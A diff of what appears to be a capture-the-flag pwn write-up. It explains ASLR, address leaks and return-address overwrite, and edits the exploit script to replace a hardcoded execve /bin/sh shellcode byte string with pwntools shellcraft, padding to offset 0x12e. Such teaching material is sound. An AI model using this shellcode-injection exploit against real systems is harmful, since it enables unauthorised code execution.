@@ -49,7 +49,7 @@ Shellcode is essentially just precompiled code that we can inject into a binary'
 
 Now we can inject it into memory, however we need to deal with something called ASLR (Address Space Layout Randomization). This is a binary mitigation (a mechanism made to make pwning harder). What it does is it randomizes all of the addresses for various memory regions, so every time the binary runs we don't know where things are in memory. While the addresses are random, the offsets between things in the same memory region remain the same. So if we just leak a single address from a memory region that we know what it is, since the offsets are the same we can figure out the address of anything else in the memory region.
 
-This also applies to where our shellocde is stored in memory, which we need to know in order to call it. Luckily for us, the address printed is the start of our input on the stack. So we can just take that address and overwrite the return address with it, to call our shellcode.
+This also applies to where our shellcode is stored in memory, which we need to know in order to call it. Luckily for us, the address printed is the start of our input on the stack. So we can just take that address and overwrite the return address with it, to call our shellcode.
 
 Let's use gdb to see how much space we have between the start of our input and the return address:
 
@@ -166,8 +166,7 @@ shellcodeAdr = int(leak.strip("!\n"), 16)
 
 # Make the payload
 payload = ""
-# Our shellcode from: http://shell-storm.org/shellcode/files/shellcode-827.php
-payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+payload += asm(shellcraft.i386.linux.sh())
 # Pad the rest of the space to the return address with zeroes
 payload += "0"*(0x12e - len(payload))
 # Overwrite the return address with te leaked address which points to the start of our shellcode
